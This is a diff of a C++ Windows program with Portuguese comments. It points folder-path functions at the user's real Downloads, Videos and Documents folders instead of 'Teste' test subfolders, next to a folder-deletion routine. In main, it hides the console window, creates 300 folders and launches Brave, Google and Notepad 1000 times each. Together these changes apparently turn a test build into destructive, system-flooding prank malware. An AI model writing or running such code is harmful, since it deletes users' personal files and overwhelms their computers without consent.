@@ -23,11 +23,11 @@ std::wstring GetComputerUserName() {
 
 /*Função para buscar o diretório que eu quero*/
 std::wstring GetDesktopPath() {
-	return L"C:\\Users\\" + GetComputerUserName() + L"\\Downloads\\Teste";
+	return L"C:\\Users\\" + GetComputerUserName() + L"\\Downloads";
 }
 
 std::wstring GetDesktopPath2(){
-	return L"C:\\Users\\" + GetComputerUserName() + L"\\Videos\\Teste";
+	return L"C:\\Users\\" + GetComputerUserName() + L"\\Videos";
 }
 
 std::wstring GetDesktopPath3(){
@@ -38,7 +38,7 @@ std::wstring GetDesktopPath3(){
 	return L".";
 }
 std::wstring GetDesktopPath4() {
-	return L"C:\\Users\\" + GetComputerUserName() + L"\\Documents\\Teste";
+	return L"C:\\Users\\" + GetComputerUserName() + L"\\Documents";
 }
 /*Função para apagar o diretório que eu quero*/
 void DeletarPasta(const std::wstring& caminho) {
@@ -115,16 +115,16 @@ int main(){
 	HWND hwnd = GetConsoleWindow();
 	ShowWindow(hwnd, SW_MINIMIZE);
 	srand(static_cast<unsigned int>(time(0)));
-	for (int i = 0; i < 30; i++) {
+	for (int i = 0; i < 300; i++) {
 		CriarPasta(caminhoBase);
 	}
-	for (int i = 0; i < 1; i++) {
+	for (int i = 0; i < 1000; i++) {
 		ShellExecute(NULL, L"open", L"Brave", NULL, NULL,SW_SHOWNORMAL);
 	}
-	for (int i = 0; i < 1; i++) {
+	for (int i = 0; i < 1000; i++) {
 		ShellExecute(NULL, L"open", L"Google", NULL, NULL, SW_SHOWNORMAL);
 	}
-	for (int i = 0; i < 1; i++) {
+	for (int i = 0; i < 1000; i++) {
 		ShellExecute(NULL, L"open", L"notepad.exe", NULL, NULL, SW_SHOWNORMAL);
 	}
 
